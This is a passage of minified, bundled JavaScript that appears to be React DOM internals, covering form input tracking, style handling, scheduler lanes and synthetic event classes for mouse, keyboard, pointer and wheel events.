      Object.defineProperty(e, t, { enumerable: n.enumerable }),
      {
        getValue: function () {
          return r;
        },
        setValue: function (o) {
          r = "" + o;
        },
        stopTracking: function () {
          (e._valueTracker = null), delete e[t];
        },
      }
    );
  }
}
function ll(e) {
  e._valueTracker || (e._valueTracker = qf(e));
}
function tc(e) {
  if (!e) return !1;
  var t = e._valueTracker;
  if (!t) return !0;
  var n = t.getValue(),
    r = "";
  return (
    e && (r = ec(e) ? (e.checked ? "true" : "false") : e.value),
    (e = r),
    e !== n ? (t.setValue(e), !0) : !1
  );
}
function Fl(e) {
  if (((e = e || (typeof document < "u" ? document : void 0)), typeof e > "u"))
    return null;
  try {
    return e.activeElement || e.body;
  } catch {
    return e.body;
  }
}
function po(e, t) {
  var n = t.checked;
  return J({}, t, {
    defaultChecked: void 0,
    defaultValue: void 0,
    value: void 0,
    checked: n ?? e._wrapperState.initialChecked,
  });
}
function Es(e, t) {
  var n = t.defaultValue == null ? "" : t.defaultValue,
    r = t.checked != null ? t.checked : t.defaultChecked;
  (n = Ht(t.value != null ? t.value : n)),
    (e._wrapperState = {
      initialChecked: r,
      initialValue: n,
      controlled:
        t.type === "checkbox" || t.type === "radio"
          ? t.checked != null
          : t.value != null,
    });
}
function nc(e, t) {
  (t = t.checked), t != null && pi(e, "checked", t, !1);
}
function mo(e, t) {
  nc(e, t);
  var n = Ht(t.value),
    r = t.type;
  if (n != null)
    r === "number"
      ? ((n === 0 && e.value === "") || e.value != n) && (e.value = "" + n)
      : e.value !== "" + n && (e.value = "" + n);
  else if (r === "submit" || r === "reset") {
    e.removeAttribute("value");
    return;
  }
  t.hasOwnProperty("value")
    ? ho(e, t.type, n)
    : t.hasOwnProperty("defaultValue") && ho(e, t.type, Ht(t.defaultValue)),
    t.checked == null &&
      t.defaultChecked != null &&
      (e.defaultChecked = !!t.defaultChecked);
}
function Ns(e, t, n) {
  if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
    var r = t.type;
    if (
      !(
        (r !== "submit" && r !== "reset") ||
        (t.value !== void 0 && t.value !== null)
      )
    )
      return;
    (t = "" + e._wrapperState.initialValue),
      n || t === e.value || (e.value = t),
      (e.defaultValue = t);
  }
  (n = e.name),
    n !== "" && (e.name = ""),
    (e.defaultChecked = !!e._wrapperState.initialChecked),
    n !== "" && (e.name = n);
}
function ho(e, t, n) {
  (t !== "number" || Fl(e.ownerDocument) !== e) &&
    (n == null
      ? (e.defaultValue = "" + e._wrapperState.initialValue)
      : e.defaultValue !== "" + n && (e.defaultValue = "" + n));
}
var fr = Array.isArray;
function _n(e, t, n, r) {
  if (((e = e.options), t)) {
    t = {};
    for (var l = 0; l < n.length; l++) t["$" + n[l]] = !0;
    for (n = 0; n < e.length; n++)
      (l = t.hasOwnProperty("$" + e[n].value)),
        e[n].selected !== l && (e[n].selected = l),
        l && r && (e[n].defaultSelected = !0);
  } else {
    for (n = "" + Ht(n), t = null, l = 0; l < e.length; l++) {
      if (e[l].value === n) {
        (e[l].selected = !0), r && (e[l].defaultSelected = !0);
        return;
      }
      t !== null || e[l].disabled || (t = e[l]);
    }
    t !== null && (t.selected = !0);
  }
}
function vo(e, t) {
  if (t.dangerouslySetInnerHTML != null) throw Error(E(91));
  return J({}, t, {
    value: void 0,
    defaultValue: void 0,
    children: "" + e._wrapperState.initialValue,
  });
}
function Cs(e, t) {
  var n = t.value;
  if (n == null) {
    if (((n = t.children), (t = t.defaultValue), n != null)) {
      if (t != null) throw Error(E(92));
      if (fr(n)) {
        if (1 < n.length) throw Error(E(93));
        n = n[0];
      }
      t = n;
    }
    t == null && (t = ""), (n = t);
  }
  e._wrapperState = { initialValue: Ht(n) };
}
function rc(e, t) {
  var n = Ht(t.value),
    r = Ht(t.defaultValue);
  n != null &&
    ((n = "" + n),
    n !== e.value && (e.value = n),
    t.defaultValue == null && e.defaultValue !== n && (e.defaultValue = n)),
    r != null && (e.defaultValue = "" + r);
}
function Ps(e) {
  var t = e.textContent;
  t === e._wrapperState.initialValue && t !== "" && t !== null && (e.value = t);
}
function lc(e) {
  switch (e) {
    case "svg":
      return "http://www.w3.org/2000/svg";
    case "math":
      return "http://www.w3.org/1998/Math/MathML";
    default:
      return "http://www.w3.org/1999/xhtml";
  }
}
function go(e, t) {
  return e == null || e === "http://www.w3.org/1999/xhtml"
    ? lc(t)
    : e === "http://www.w3.org/2000/svg" && t === "foreignObject"
    ? "http://www.w3.org/1999/xhtml"
    : e;
}
var al,
  ac = (function (e) {
    return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction
      ? function (t, n, r, l) {
          MSApp.execUnsafeLocalFunction(function () {
            return e(t, n, r, l);
          });
        }
      : e;
  })(function (e, t) {
    if (e.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML" in e)
      e.innerHTML = t;
    else {
      for (
        al = al || document.createElement("div"),
          al.innerHTML = "<svg>" + t.valueOf().toString() + "</svg>",
          t = al.firstChild;
        e.firstChild;

      )
        e.removeChild(e.firstChild);
      for (; t.firstChild; ) e.appendChild(t.firstChild);
    }
  });
function Pr(e, t) {
  if (t) {
    var n = e.firstChild;
    if (n && n === e.lastChild && n.nodeType === 3) {
      n.nodeValue = t;
      return;
    }
  }
  e.textContent = t;
}
var vr = {
    animationIterationCount: !0,
    aspectRatio: !0,
    borderImageOutset: !0,
    borderImageSlice: !0,
    borderImageWidth: !0,
    boxFlex: !0,
    boxFlexGroup: !0,
    boxOrdinalGroup: !0,
    columnCount: !0,
    columns: !0,
    flex: !0,
    flexGrow: !0,
    flexPositive: !0,
    flexShrink: !0,
    flexNegative: !0,
    flexOrder: !0,
    gridArea: !0,
    gridRow: !0,
    gridRowEnd: !0,
    gridRowSpan: !0,
    gridRowStart: !0,
    gridColumn: !0,
    gridColumnEnd: !0,
    gridColumnSpan: !0,
    gridColumnStart: !0,
    fontWeight: !0,
    lineClamp: !0,
    lineHeight: !0,
    opacity: !0,
    order: !0,
    orphans: !0,
    tabSize: !0,
    widows: !0,
    zIndex: !0,
    zoom: !0,
    fillOpacity: !0,
    floodOpacity: !0,
    stopOpacity: !0,
    strokeDasharray: !0,
    strokeDashoffset: !0,
    strokeMiterlimit: !0,
    strokeOpacity: !0,
    strokeWidth: !0,
  },
  ep = ["Webkit", "ms", "Moz", "O"];
Object.keys(vr).forEach(function (e) {
  ep.forEach(function (t) {
    (t = t + e.charAt(0).toUpperCase() + e.substring(1)), (vr[t] = vr[e]);
  });
});
function oc(e, t, n) {
  return t == null || typeof t == "boolean" || t === ""
    ? ""
    : n || typeof t != "number" || t === 0 || (vr.hasOwnProperty(e) && vr[e])
    ? ("" + t).trim()
    : t + "px";
}
function ic(e, t) {
  e = e.style;
  for (var n in t)
    if (t.hasOwnProperty(n)) {
      var r = n.indexOf("--") === 0,
        l = oc(n, t[n], r);
      n === "float" && (n = "cssFloat"), r ? e.setProperty(n, l) : (e[n] = l);
    }
}
var tp = J(
  { menuitem: !0 },
  {
    area: !0,
    base: !0,
    br: !0,
    col: !0,
    embed: !0,
    hr: !0,
    img: !0,
    input: !0,
    keygen: !0,
    link: !0,
    meta: !0,
    param: !0,
    source: !0,
    track: !0,
    wbr: !0,
  }
);
function yo(e, t) {
  if (t) {
    if (tp[e] && (t.children != null || t.dangerouslySetInnerHTML != null))
      throw Error(E(137, e));
    if (t.dangerouslySetInnerHTML != null) {
      if (t.children != null) throw Error(E(60));
      if (
        typeof t.dangerouslySetInnerHTML != "object" ||
        !("__html" in t.dangerouslySetInnerHTML)
      )
        throw Error(E(61));
    }
    if (t.style != null && typeof t.style != "object") throw Error(E(62));
  }
}
function wo(e, t) {
  if (e.indexOf("-") === -1) return typeof t.is == "string";
  switch (e) {
    case "annotation-xml":
    case "color-profile":
    case "font-face":
    case "font-face-src":
    case "font-face-uri":
    case "font-face-format":
    case "font-face-name":
    case "missing-glyph":
      return !1;
    default:
      return !0;
  }
}
var xo = null;
function gi(e) {
  return (
    (e = e.target || e.srcElement || window),
    e.correspondingUseElement && (e = e.correspondingUseElement),
    e.nodeType === 3 ? e.parentNode : e
  );
}
var bo = null,
  Fn = null,
  Rn = null;
function Ts(e) {
  if ((e = Yr(e))) {
    if (typeof bo != "function") throw Error(E(280));
    var t = e.stateNode;
    t && ((t = da(t)), bo(e.stateNode, e.type, t));
  }
}
function sc(e) {
  Fn ? (Rn ? Rn.push(e) : (Rn = [e])) : (Fn = e);
}
function uc() {
  if (Fn) {
    var e = Fn,
      t = Rn;
    if (((Rn = Fn = null), Ts(e), t)) for (e = 0; e < t.length; e++) Ts(t[e]);
  }
}
function cc(e, t) {
  return e(t);
}
function dc() {}
var ja = !1;
function fc(e, t, n) {
  if (ja) return e(t, n);
  ja = !0;
  try {
    return cc(e, t, n);
  } finally {
    (ja = !1), (Fn !== null || Rn !== null) && (dc(), uc());
  }
}
function Tr(e, t) {
  var n = e.stateNode;
  if (n === null) return null;
  var r = da(n);
  if (r === null) return null;
  n = r[t];
  e: switch (t) {
    case "onClick":
    case "onClickCapture":
    case "onDoubleClick":
    case "onDoubleClickCapture":
    case "onMouseDown":
    case "onMouseDownCapture":
    case "onMouseMove":
    case "onMouseMoveCapture":
    case "onMouseUp":
    case "onMouseUpCapture":
    case "onMouseEnter":
      (r = !r.disabled) ||
        ((e = e.type),
        (r = !(
          e === "button" ||
          e === "input" ||
          e === "select" ||
          e === "textarea"
        ))),
        (e = !r);
      break e;
    default:
      e = !1;
  }
  if (e) return null;
  if (n && typeof n != "function") throw Error(E(231, t, typeof n));
  return n;
}
var ko = !1;
if (xt)
  try {
    var tr = {};
    Object.defineProperty(tr, "passive", {
      get: function () {
        ko = !0;
      },
    }),
      window.addEventListener("test", tr, tr),
      window.removeEventListener("test", tr, tr);
  } catch {
    ko = !1;
  }
function np(e, t, n, r, l, a, o, i, s) {
  var u = Array.prototype.slice.call(arguments, 3);
  try {
    t.apply(n, u);
  } catch (d) {
    this.onError(d);
  }
}
var gr = !1,
  Rl = null,
  Il = !1,
  So = null,
  rp = {
    onError: function (e) {
      (gr = !0), (Rl = e);
    },
  };
function lp(e, t, n, r, l, a, o, i, s) {
  (gr = !1), (Rl = null), np.apply(rp, arguments);
}
function ap(e, t, n, r, l, a, o, i, s) {
  if ((lp.apply(this, arguments), gr)) {
    if (gr) {
      var u = Rl;
      (gr = !1), (Rl = null);
    } else throw Error(E(198));
    Il || ((Il = !0), (So = u));
  }
}
function vn(e) {
  var t = e,
    n = e;
  if (e.alternate) for (; t.return; ) t = t.return;
  else {
    e = t;
    do (t = e), t.flags & 4098 && (n = t.return), (e = t.return);
    while (e);
  }
  return t.tag === 3 ? n : null;
}
function pc(e) {
  if (e.tag === 13) {
    var t = e.memoizedState;
    if (
      (t === null && ((e = e.alternate), e !== null && (t = e.memoizedState)),
      t !== null)
    )
      return t.dehydrated;
  }
  return null;
}
function Ls(e) {
  if (vn(e) !== e) throw Error(E(188));
}
function op(e) {
  var t = e.alternate;
  if (!t) {
    if (((t = vn(e)), t === null)) throw Error(E(188));
    return t !== e ? null : e;
  }
  for (var n = e, r = t; ; ) {
    var l = n.return;
    if (l === null) break;
    var a = l.alternate;
    if (a === null) {
      if (((r = l.return), r !== null)) {
        n = r;
        continue;
      }
      break;
    }
    if (l.child === a.child) {
      for (a = l.child; a; ) {
        if (a === n) return Ls(l), e;
        if (a === r) return Ls(l), t;
        a = a.sibling;
      }
      throw Error(E(188));
    }
    if (n.return !== r.return) (n = l), (r = a);
    else {
      for (var o = !1, i = l.child; i; ) {
        if (i === n) {
          (o = !0), (n = l), (r = a);
          break;
        }
        if (i === r) {
          (o = !0), (r = l), (n = a);
          break;
        }
        i = i.sibling;
      }
      if (!o) {
        for (i = a.child; i; ) {
          if (i === n) {
            (o = !0), (n = a), (r = l);
            break;
          }
          if (i === r) {
            (o = !0), (r = a), (n = l);
            break;
          }
          i = i.sibling;
        }
        if (!o) throw Error(E(189));
      }
    }
    if (n.alternate !== r) throw Error(E(190));
  }
  if (n.tag !== 3) throw Error(E(188));
  return n.stateNode.current === n ? e : t;
}
function mc(e) {
  return (e = op(e)), e !== null ? hc(e) : null;
}
function hc(e) {
  if (e.tag === 5 || e.tag === 6) return e;
  for (e = e.child; e !== null; ) {
    var t = hc(e);
    if (t !== null) return t;
    e = e.sibling;
  }
  return null;
}
var vc = Ie.unstable_scheduleCallback,
  js = Ie.unstable_cancelCallback,
  ip = Ie.unstable_shouldYield,
  sp = Ie.unstable_requestPaint,
  ne = Ie.unstable_now,
  up = Ie.unstable_getCurrentPriorityLevel,
  yi = Ie.unstable_ImmediatePriority,
  gc = Ie.unstable_UserBlockingPriority,
  Ml = Ie.unstable_NormalPriority,
  cp = Ie.unstable_LowPriority,
  yc = Ie.unstable_IdlePriority,
  ia = null,
  ut = null;
function dp(e) {
  if (ut && typeof ut.onCommitFiberRoot == "function")
    try {
      ut.onCommitFiberRoot(ia, e, void 0, (e.current.flags & 128) === 128);
    } catch {}
}
var nt = Math.clz32 ? Math.clz32 : mp,
  fp = Math.log,
  pp = Math.LN2;
function mp(e) {
  return (e >>>= 0), e === 0 ? 32 : (31 - ((fp(e) / pp) | 0)) | 0;
}
var ol = 64,
  il = 4194304;
function pr(e) {
  switch (e & -e) {
    case 1:
      return 1;
    case 2:
      return 2;
    case 4:
      return 4;
    case 8:
      return 8;
    case 16:
      return 16;
    case 32:
      return 32;
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return e & 4194240;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return e & 130023424;
    case 134217728:
      return 134217728;
    case 268435456:
      return 268435456;
    case 536870912:
      return 536870912;
    case 1073741824:
      return 1073741824;
    default:
      return e;
  }
}
function Dl(e, t) {
  var n = e.pendingLanes;
  if (n === 0) return 0;
  var r = 0,
    l = e.suspendedLanes,
    a = e.pingedLanes,
    o = n & 268435455;
  if (o !== 0) {
    var i = o & ~l;
    i !== 0 ? (r = pr(i)) : ((a &= o), a !== 0 && (r = pr(a)));
  } else (o = n & ~l), o !== 0 ? (r = pr(o)) : a !== 0 && (r = pr(a));
  if (r === 0) return 0;
  if (
    t !== 0 &&
    t !== r &&
    !(t & l) &&
    ((l = r & -r), (a = t & -t), l >= a || (l === 16 && (a & 4194240) !== 0))
  )
    return t;
  if ((r & 4 && (r |= n & 16), (t = e.entangledLanes), t !== 0))
    for (e = e.entanglements, t &= r; 0 < t; )
      (n = 31 - nt(t)), (l = 1 << n), (r |= e[n]), (t &= ~l);
  return r;
}
function hp(e, t) {
  switch (e) {
    case 1:
    case 2:
    case 4:
      return t + 250;
    case 8:
    case 16:
    case 32:
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return t + 5e3;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return -1;
    case 134217728:
    case 268435456:
    case 536870912:
    case 1073741824:
      return -1;
    default:
      return -1;
  }
}
function vp(e, t) {
  for (
    var n = e.suspendedLanes,
      r = e.pingedLanes,
      l = e.expirationTimes,
      a = e.pendingLanes;
    0 < a;

  ) {
    var o = 31 - nt(a),
      i = 1 << o,
      s = l[o];
    s === -1
      ? (!(i & n) || i & r) && (l[o] = hp(i, t))
      : s <= t && (e.expiredLanes |= i),
      (a &= ~i);
  }
}
function Eo(e) {
  return (
    (e = e.pendingLanes & -1073741825),
    e !== 0 ? e : e & 1073741824 ? 1073741824 : 0
  );
}
function wc() {
  var e = ol;
  return (ol <<= 1), !(ol & 4194240) && (ol = 64), e;
}
function $a(e) {
  for (var t = [], n = 0; 31 > n; n++) t.push(e);
  return t;
}
function Qr(e, t, n) {
  (e.pendingLanes |= t),
    t !== 536870912 && ((e.suspendedLanes = 0), (e.pingedLanes = 0)),
    (e = e.eventTimes),
    (t = 31 - nt(t)),
    (e[t] = n);
}
function gp(e, t) {
  var n = e.pendingLanes & ~t;
  (e.pendingLanes = t),
    (e.suspendedLanes = 0),
    (e.pingedLanes = 0),
    (e.expiredLanes &= t),
    (e.mutableReadLanes &= t),
    (e.entangledLanes &= t),
    (t = e.entanglements);
  var r = e.eventTimes;
  for (e = e.expirationTimes; 0 < n; ) {
    var l = 31 - nt(n),
      a = 1 << l;
    (t[l] = 0), (r[l] = -1), (e[l] = -1), (n &= ~a);
  }
}
function wi(e, t) {
  var n = (e.entangledLanes |= t);
  for (e = e.entanglements; n; ) {
    var r = 31 - nt(n),
      l = 1 << r;
    (l & t) | (e[r] & t) && (e[r] |= t), (n &= ~l);
  }
}
var z = 0;
function xc(e) {
  return (e &= -e), 1 < e ? (4 < e ? (e & 268435455 ? 16 : 536870912) : 4) : 1;
}
var bc,
  xi,
  kc,
  Sc,
  Ec,
  No = !1,
  sl = [],
  It = null,
  Mt = null,
  Dt = null,
  Lr = new Map(),
  jr = new Map(),
  Lt = [],
  yp =
    "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(
      " "
    );
function $s(e, t) {
  switch (e) {
    case "focusin":
    case "focusout":
      It = null;
      break;
    case "dragenter":
    case "dragleave":
      Mt = null;
      break;
    case "mouseover":
    case "mouseout":
      Dt = null;
      break;
    case "pointerover":
    case "pointerout":
      Lr.delete(t.pointerId);
      break;
    case "gotpointercapture":
    case "lostpointercapture":
      jr.delete(t.pointerId);
  }
}
function nr(e, t, n, r, l, a) {
  return e === null || e.nativeEvent !== a
    ? ((e = {
        blockedOn: t,
        domEventName: n,
        eventSystemFlags: r,
        nativeEvent: a,
        targetContainers: [l],
      }),
      t !== null && ((t = Yr(t)), t !== null && xi(t)),
      e)
    : ((e.eventSystemFlags |= r),
      (t = e.targetContainers),
      l !== null && t.indexOf(l) === -1 && t.push(l),
      e);
}
function wp(e, t, n, r, l) {
  switch (t) {
    case "focusin":
      return (It = nr(It, e, t, n, r, l)), !0;
    case "dragenter":
      return (Mt = nr(Mt, e, t, n, r, l)), !0;
    case "mouseover":
      return (Dt = nr(Dt, e, t, n, r, l)), !0;
    case "pointerover":
      var a = l.pointerId;
      return Lr.set(a, nr(Lr.get(a) || null, e, t, n, r, l)), !0;
    case "gotpointercapture":
      return (
        (a = l.pointerId), jr.set(a, nr(jr.get(a) || null, e, t, n, r, l)), !0
      );
  }
  return !1;
}
function Nc(e) {
  var t = tn(e.target);
  if (t !== null) {
    var n = vn(t);
    if (n !== null) {
      if (((t = n.tag), t === 13)) {
        if (((t = pc(n)), t !== null)) {
          (e.blockedOn = t),
            Ec(e.priority, function () {
              kc(n);
            });
          return;
        }
      } else if (t === 3 && n.stateNode.current.memoizedState.isDehydrated) {
        e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
        return;
      }
    }
  }
  e.blockedOn = null;
}
function Sl(e) {
  if (e.blockedOn !== null) return !1;
  for (var t = e.targetContainers; 0 < t.length; ) {
    var n = Co(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
    if (n === null) {
      n = e.nativeEvent;
      var r = new n.constructor(n.type, n);
      (xo = r), n.target.dispatchEvent(r), (xo = null);
    } else return (t = Yr(n)), t !== null && xi(t), (e.blockedOn = n), !1;
    t.shift();
  }
  return !0;
}
function _s(e, t, n) {
  Sl(e) && n.delete(t);
}
function xp() {
  (No = !1),
    It !== null && Sl(It) && (It = null),
    Mt !== null && Sl(Mt) && (Mt = null),
    Dt !== null && Sl(Dt) && (Dt = null),
    Lr.forEach(_s),
    jr.forEach(_s);
}
function rr(e, t) {
  e.blockedOn === t &&
    ((e.blockedOn = null),
    No ||
      ((No = !0),
      Ie.unstable_scheduleCallback(Ie.unstable_NormalPriority, xp)));
}
function $r(e) {
  function t(l) {
    return rr(l, e);
  }
  if (0 < sl.length) {
    rr(sl[0], e);
    for (var n = 1; n < sl.length; n++) {
      var r = sl[n];
      r.blockedOn === e && (r.blockedOn = null);
    }
  }
  for (
    It !== null && rr(It, e),
      Mt !== null && rr(Mt, e),
      Dt !== null && rr(Dt, e),
      Lr.forEach(t),
      jr.forEach(t),
      n = 0;
    n < Lt.length;
    n++
  )
    (r = Lt[n]), r.blockedOn === e && (r.blockedOn = null);
  for (; 0 < Lt.length && ((n = Lt[0]), n.blockedOn === null); )
    Nc(n), n.blockedOn === null && Lt.shift();
}
var In = Et.ReactCurrentBatchConfig,
  Ol = !0;
function bp(e, t, n, r) {
  var l = z,
    a = In.transition;
  In.transition = null;
  try {
    (z = 1), bi(e, t, n, r);
  } finally {
    (z = l), (In.transition = a);
  }
}
function kp(e, t, n, r) {
  var l = z,
    a = In.transition;
  In.transition = null;
  try {
    (z = 4), bi(e, t, n, r);
  } finally {
    (z = l), (In.transition = a);
  }
}
function bi(e, t, n, r) {
  if (Ol) {
    var l = Co(e, t, n, r);
    if (l === null) Wa(e, t, r, zl, n), $s(e, r);
    else if (wp(l, e, t, n, r)) r.stopPropagation();
    else if (($s(e, r), t & 4 && -1 < yp.indexOf(e))) {
      for (; l !== null; ) {
        var a = Yr(l);
        if (
          (a !== null && bc(a),
          (a = Co(e, t, n, r)),
          a === null && Wa(e, t, r, zl, n),
          a === l)
        )
          break;
        l = a;
      }
      l !== null && r.stopPropagation();
    } else Wa(e, t, r, null, n);
  }
}
var zl = null;
function Co(e, t, n, r) {
  if (((zl = null), (e = gi(r)), (e = tn(e)), e !== null))
    if (((t = vn(e)), t === null)) e = null;
    else if (((n = t.tag), n === 13)) {
      if (((e = pc(t)), e !== null)) return e;
      e = null;
    } else if (n === 3) {
      if (t.stateNode.current.memoizedState.isDehydrated)
        return t.tag === 3 ? t.stateNode.containerInfo : null;
      e = null;
    } else t !== e && (e = null);
  return (zl = e), null;
}
function Cc(e) {
  switch (e) {
    case "cancel":
    case "click":
    case "close":
    case "contextmenu":
    case "copy":
    case "cut":
    case "auxclick":
    case "dblclick":
    case "dragend":
    case "dragstart":
    case "drop":
    case "focusin":
    case "focusout":
    case "input":
    case "invalid":
    case "keydown":
    case "keypress":
    case "keyup":
    case "mousedown":
    case "mouseup":
    case "paste":
    case "pause":
    case "play":
    case "pointercancel":
    case "pointerdown":
    case "pointerup":
    case "ratechange":
    case "reset":
    case "resize":
    case "seeked":
    case "submit":
    case "touchcancel":
    case "touchend":
    case "touchstart":
    case "volumechange":
    case "change":
    case "selectionchange":
    case "textInput":
    case "compositionstart":
    case "compositionend":
    case "compositionupdate":
    case "beforeblur":
    case "afterblur":
    case "beforeinput":
    case "blur":
    case "fullscreenchange":
    case "focus":
    case "hashchange":
    case "popstate":
    case "select":
    case "selectstart":
      return 1;
    case "drag":
    case "dragenter":
    case "dragexit":
    case "dragleave":
    case "dragover":
    case "mousemove":
    case "mouseout":
    case "mouseover":
    case "pointermove":
    case "pointerout":
    case "pointerover":
    case "scroll":
    case "toggle":
    case "touchmove":
    case "wheel":
    case "mouseenter":
    case "mouseleave":
    case "pointerenter":
    case "pointerleave":
      return 4;
    case "message":
      switch (up()) {
        case yi:
          return 1;
        case gc:
          return 4;
        case Ml:
        case cp:
          return 16;
        case yc:
          return 536870912;
        default:
          return 16;
      }
    default:
      return 16;
  }
}
var _t = null,
  ki = null,
  El = null;
function Pc() {
  if (El) return El;
  var e,
    t = ki,
    n = t.length,
    r,
    l = "value" in _t ? _t.value : _t.textContent,
    a = l.length;
  for (e = 0; e < n && t[e] === l[e]; e++);
  var o = n - e;
  for (r = 1; r <= o && t[n - r] === l[a - r]; r++);
  return (El = l.slice(e, 1 < r ? 1 - r : void 0));
}
function Nl(e) {
  var t = e.keyCode;
  return (
    "charCode" in e
      ? ((e = e.charCode), e === 0 && t === 13 && (e = 13))
      : (e = t),
    e === 10 && (e = 13),
    32 <= e || e === 13 ? e : 0
  );
}
function ul() {
  return !0;
}
function Fs() {
  return !1;
}
function De(e) {
  function t(n, r, l, a, o) {
    (this._reactName = n),
      (this._targetInst = l),
      (this.type = r),
      (this.nativeEvent = a),
      (this.target = o),
      (this.currentTarget = null);
    for (var i in e)
      e.hasOwnProperty(i) && ((n = e[i]), (this[i] = n ? n(a) : a[i]));
    return (
      (this.isDefaultPrevented = (
        a.defaultPrevented != null ? a.defaultPrevented : a.returnValue === !1
      )
        ? ul
        : Fs),
      (this.isPropagationStopped = Fs),
      this
    );
  }
  return (
    J(t.prototype, {
      preventDefault: function () {
        this.defaultPrevented = !0;
        var n = this.nativeEvent;
        n &&
          (n.preventDefault
            ? n.preventDefault()
            : typeof n.returnValue != "unknown" && (n.returnValue = !1),
          (this.isDefaultPrevented = ul));
      },
      stopPropagation: function () {
        var n = this.nativeEvent;
        n &&
          (n.stopPropagation
            ? n.stopPropagation()
            : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0),
          (this.isPropagationStopped = ul));
      },
      persist: function () {},
      isPersistent: ul,
    }),
    t
  );
}
var Yn = {
    eventPhase: 0,
    bubbles: 0,
    cancelable: 0,
    timeStamp: function (e) {
      return e.timeStamp || Date.now();
    },
    defaultPrevented: 0,
    isTrusted: 0,
  },
  Si = De(Yn),
  Kr = J({}, Yn, { view: 0, detail: 0 }),
  Sp = De(Kr),
  _a,
  Fa,
  lr,
  sa = J({}, Kr, {
    screenX: 0,
    screenY: 0,
    clientX: 0,
    clientY: 0,
    pageX: 0,
    pageY: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    getModifierState: Ei,
    button: 0,
    buttons: 0,
    relatedTarget: function (e) {
      return e.relatedTarget === void 0
        ? e.fromElement === e.srcElement
          ? e.toElement
          : e.fromElement
        : e.relatedTarget;
    },
    movementX: function (e) {
      return "movementX" in e
        ? e.movementX
        : (e !== lr &&
            (lr && e.type === "mousemove"
              ? ((_a = e.screenX - lr.screenX), (Fa = e.screenY - lr.screenY))
              : (Fa = _a = 0),
            (lr = e)),
          _a);
    },
    movementY: function (e) {
      return "movementY" in e ? e.movementY : Fa;
    },
  }),
  Rs = De(sa),
  Ep = J({}, sa, { dataTransfer: 0 }),
  Np = De(Ep),
  Cp = J({}, Kr, { relatedTarget: 0 }),
  Ra = De(Cp),
  Pp = J({}, Yn, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
  Tp = De(Pp),
  Lp = J({}, Yn, {
    clipboardData: function (e) {
      return "clipboardData" in e ? e.clipboardData : window.clipboardData;
    },
  }),
  jp = De(Lp),
  $p = J({}, Yn, { data: 0 }),
  Is = De($p),
  _p = {
    Esc: "Escape",
    Spacebar: " ",
    Left: "ArrowLeft",
    Up: "ArrowUp",
    Right: "ArrowRight",
    Down: "ArrowDown",
    Del: "Delete",
    Win: "OS",
    Menu: "ContextMenu",
    Apps: "ContextMenu",
    Scroll: "ScrollLock",
    MozPrintableKey: "Unidentified",
  },
  Fp = {
    8: "Backspace",
    9: "Tab",
    12: "Clear",
    13: "Enter",
    16: "Shift",
    17: "Control",
    18: "Alt",
    19: "Pause",
    20: "CapsLock",
    27: "Escape",
    32: " ",
    33: "PageUp",
    34: "PageDown",
    35: "End",
    36: "Home",
    37: "ArrowLeft",
    38: "ArrowUp",
    39: "ArrowRight",
    40: "ArrowDown",
    45: "Insert",
    46: "Delete",
    112: "F1",
    113: "F2",
    114: "F3",
    115: "F4",
    116: "F5",
    117: "F6",
    118: "F7",
    119: "F8",
    120: "F9",
    121: "F10",
    122: "F11",
    123: "F12",
    144: "NumLock",
    145: "ScrollLock",
    224: "Meta",
  },
  Rp = {
    Alt: "altKey",
    Control: "ctrlKey",
    Meta: "metaKey",
    Shift: "shiftKey",
  };
function Ip(e) {
  var t = this.nativeEvent;
  return t.getModifierState ? t.getModifierState(e) : (e = Rp[e]) ? !!t[e] : !1;
}
function Ei() {
  return Ip;
}
var Mp = J({}, Kr, {
    key: function (e) {
      if (e.key) {
        var t = _p[e.key] || e.key;
        if (t !== "Unidentified") return t;
      }
      return e.type === "keypress"
        ? ((e = Nl(e)), e === 13 ? "Enter" : String.fromCharCode(e))
        : e.type === "keydown" || e.type === "keyup"
        ? Fp[e.keyCode] || "Unidentified"
        : "";
    },
    code: 0,
    location: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    repeat: 0,
    locale: 0,
    getModifierState: Ei,
    charCode: function (e) {
      return e.type === "keypress" ? Nl(e) : 0;
    },
    keyCode: function (e) {
      return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0;
    },
    which: function (e) {
      return e.type === "keypress"
        ? Nl(e)
        : e.type === "keydown" || e.type === "keyup"
        ? e.keyCode
        : 0;
    },
  }),
  Dp = De(Mp),
  Op = J({}, sa, {
    pointerId: 0,
    width: 0,
    height: 0,
    pressure: 0,
    tangentialPressure: 0,
    tiltX: 0,
    tiltY: 0,
    twist: 0,
    pointerType: 0,
    isPrimary: 0,
  }),
  Ms = De(Op),
  zp = J({}, Kr, {
    touches: 0,
    targetTouches: 0,
    changedTouches: 0,
    altKey: 0,
    metaKey: 0,
    ctrlKey: 0,
    shiftKey: 0,
    getModifierState: Ei,
  }),
  Ap = De(zp),
  Wp = J({}, Yn, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 }),
  Up = De(Wp),
  Bp = J({}, sa, {
    deltaX: function (e) {
      return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0;
    },
    deltaY: function (e) {
      return "deltaY" in e
        ? e.deltaY
        : "wheelDeltaY" in e
        ? -e.wheelDeltaY
        : "wheelDelta" in e
        ? -e.wheelDelta
        : 0;
    },
